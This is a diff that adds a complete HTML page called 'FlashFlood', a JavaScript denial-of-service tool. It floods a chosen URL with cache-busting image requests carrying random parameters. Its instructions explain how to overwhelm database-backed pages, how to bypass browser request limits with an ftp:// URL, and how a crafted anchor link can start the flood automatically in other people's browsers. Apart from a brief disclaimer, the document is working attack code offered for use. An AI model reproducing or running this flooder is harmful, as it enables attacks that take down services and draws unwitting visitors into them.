@@ -1,0 +1,106 @@
+<html>
+	<head>
+		<meta http-equiv="content-type" content="text/html; charset=ISO-8859-1">
+
+		<title>FlashFlood</title>
+		<script type="text/javascript">
+			var intervalId = 0;
+			
+			function startPings() {
+				//disable buttons to prevent tampering
+				a = document.getElementsByTagName("input");
+				for(i=0;i<a.length;i++) a[i].disabled = true;
+				
+				//but enable stop button
+				b = document.getElementById("stop");
+				b.disabled = false;
+	
+				//initiates the page pinging
+				c = document.getElementById("wait").value;
+				intervalId = setInterval("pingPage()",c);
+				d = document.getElementById("running");
+				d.innerHTML = "<b>RUNNING!</b>";
+			}
+			
+			function stopPings() {
+				//enable buttons to allow changing
+				a = document.getElementsByTagName("input");
+				for(i=0;i<a.length;i++) a[i].disabled = false;
+				
+				//but disable stop button
+				b = document.getElementById("stop");
+				b.disabled = true;
+				
+				//cancels the page pinging
+				clearInterval(intervalId);
+				d = document.getElementById("running");
+				d.innerHTML = "<b>Stopped.</b>";
+			}
+	
+			function makestring(type) {
+				var text = "";
+				var maxlength;
+				var possible;
+	                        if (type == "value") { 
+				  possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+	                          maxlength = 1 + Math.floor(Math.random()*8)
+	                        }
+				if (type == "param") {
+				  possible = "abcdefghijklmnopqrstuvwxyz";
+	                          maxlength = 1 + Math.floor(Math.random()*4)
+	                        }
+				for (var i=0; i < maxlength; i++) {
+					text += possible.charAt(Math.floor(Math.random() * possible.length));
+				}
+				return text;
+			}
+			
+			function pingPage() {
+				//create non-cached URL
+				a = document.getElementById("url").value;
+				(a.match(/\?/) == null) ? a += "?": a += "&";
+				b = Date();
+				c = makestring("param");
+				d = makestring("value");
+				a += c + "=" + d;
+	
+				//ping url with a hidden image
+				x = document.createElement("img");
+				x.style.display = "none";
+				x.src = a;
+				document.body.appendChild(x);
+	
+				//update status
+				e = document.getElementById("status");
+				e.innerHTML = "Pinged " + a + " at " + b + "<br />";
+			}
+			function checkanchor(anchorvalue) {
+				if (anchorvalue) {
+					var re = /target=(.*)&/;
+					var reduex = /timer=(.*)/;
+                                        var target = anchorvalue.match(re)[1]; 
+                                        var timer = anchorvalue.match(reduex)[1]; 
+					document.getElementById("url").value = target;
+					document.getElementById("wait").value = timer;
+					startPings();
+				}
+			}
+		</script>
+	</head>
+	<body onload="checkanchor(window.location.hash);">
+		<br><h1 align="center">JavaScript Ultra-Lightweight Flooder</h1><br>
+		<noscript><div align="center"><font color="red">Requires JavaScript to work</font></div></noscript>
+		<b>By:</b> Azizjon Mamashoev<br><br>
+		<b>Background:</b> This is designed to be an ultra-lightweight flooder.  This almost certainly won't take down a remote machine by itself, but with a handful of machines it can easily swamp a server if it's hitting a search function, or some other intensive Database driven page.  It's particularly hard to stop than a normal GET/POST request flood because it uses different parameters and values each time, making it hard to protect with a typical caching server, and instead requires an actual IP block or some other network based control.  Said another way, naked webservers that aren't protected will have a harder time dealing with this.  This technique has been used before in attacks against Iran during the green revolution and has been demonstrated by Jeremiah Grossman and Matt Johansen at the Blackhat security conference as well.<br><br>
+		<b>Disclaimer:</b> This is just proof of concept code, and should not actually be used to commit any crime.  See <a href="http://www.dailydot.com/news/anonymous-indicted-operation-payback/">this</a> as one of many examples of how people's lives get ruined when they perform DoS/DDoS attacks. Regardless of their intention or your opinion on the law, their lives are probably not happy ones right now.  Don't say I didn't warn you!<br><br>
+		<b>Operating instructions:</b> Enter a URL, and the number of milliseconds to wait between each ping. A randomly defined paramater and value will be appended to the query string to prevent cacheing.  The flood will cease as soon as the user clicks "Stop", close the browser, or as soon as they navigate away from the page.  Note: I did NOT make this idiot proof... don't leave fields blank. And don't blame me if you destroy the intarwebs.<br><br>
+		<b>Alternative instructions:</b> If you want to run this with one click - or have others run it with one click you can instantiate it and automatically run using anchor tags like this: <br><br><div align="center">path.to/flashflood.html#target=http://www.example.com/&timer=1000</div><br>
+		Note: If you type "http://www.example.com/" or "https://www.example.com/" the browser will be limited to around 6 requests a second per browser instance at most (equivalent to chosing ~167 milliseconds).  If you use "ftp://www.example.com:80/" the browser will only be bandwidth limited):<br><br>
+		URL: <br>
+<input id="url" size="100" type="text" value="http://www.example.com/"><br><br><br>
+		Milliseconds between requests (the smaller the number the more aggressive the flood of requests):<br><input id="wait" type="text" value="1000"><br><br>
+		<input value="Start" id="start" onclick="startPings()" type="button"><input value="Stop" id="stop" onclick="stopPings()" disabled="disabled" type="button"><br><br>
+		Status: <span id="running"></span><br>
+		<div id="status"></div>
+	</body>
+</html>
